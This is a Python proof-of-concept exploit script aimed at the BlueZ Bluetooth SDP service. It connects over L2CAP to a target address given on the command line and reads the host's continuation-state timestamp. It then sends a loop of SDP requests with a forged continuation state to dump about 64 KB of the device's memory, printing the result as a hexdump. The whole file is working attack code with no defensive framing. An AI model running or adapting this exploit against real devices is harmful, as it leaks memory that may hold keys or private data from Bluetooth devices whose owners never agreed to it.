import bluetooth, sys, hexdump
from scapy.layers.bluetooth import *

# The Bluez continuation state structure
class BlueZ_ContinuationState(Packet):
    fields_desc = [
        LEIntField("timestamp", 0),
        LEShortField("maxBytesSent", 0),
        LEShortField("lastIndexSent", 0),
    ]

# A SDP Service Search Request with attributes
class SDP_ServiceSearchAttributeRequest(Packet):
    fields_desc = [
        ByteField("pdu_id",0x06),
        ShortField("transaction_id", 0x00),
        ShortField("param_len", 0),
        FieldListField("search_pattern", 0x00, ByteField("", None)),
        ShortField("max_attr_byte_count", 0),
        FieldListField("attr_id_list", 0x00, ByteField("", None)),
        ByteField("cont_state_len", 0),
    ]

    def post_build(self, p, pay):
        if not self.param_len:
            p = p[:3]+struct.pack("!H", len(p[5:]) + len(pay))+p[5:]
        if not self.cont_state_len:
            p = p[:-1]+struct.pack("B", len(pay))
        return p + pay


# Get the target from args and define an MTU
target = sys.argv[1]
mtu = 512

# Create a L2CAP socket and connect to the target
print("Connecting L2CAP socket...")
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
sock.connect((target, 1))

# Send first SDP request to get host timestamp
req1 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                            attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                            max_attr_byte_count = 10)
sock.send(bytes(req1))
resp1 = sock.recv(mtu)

# Parse the recieved contiunation state
cont_state = resp1[-8:]
host_timestamp = int.from_bytes(cont_state[:4], byteorder = 'little')
print("Extracted timestamp:", hex(host_timestamp))

# Create malicious SDP requests by adding forged continuation state
received_data = b''
offset = 65535

print("Dumping", offset, "bytes of memory...")
while offset > 0:
    print("Sending SDP req, offset:", offset)
    req2 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                                attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                                max_attr_byte_count = 65535)
    forged_cont_state = BlueZ_ContinuationState(timestamp = host_timestamp, 
                                maxBytesSent = offset) 
    req2 = req2 / forged_cont_state
    sock.send(bytes(req2))

    data = sock.recv(mtu)
    data = data[7:] # Remove SDP params
    data = data[:-9] # Remove continuation state
    received_data = data + received_data
    offset -= len(data) if len(data) > 0 else 1

print(hexdump(received_data))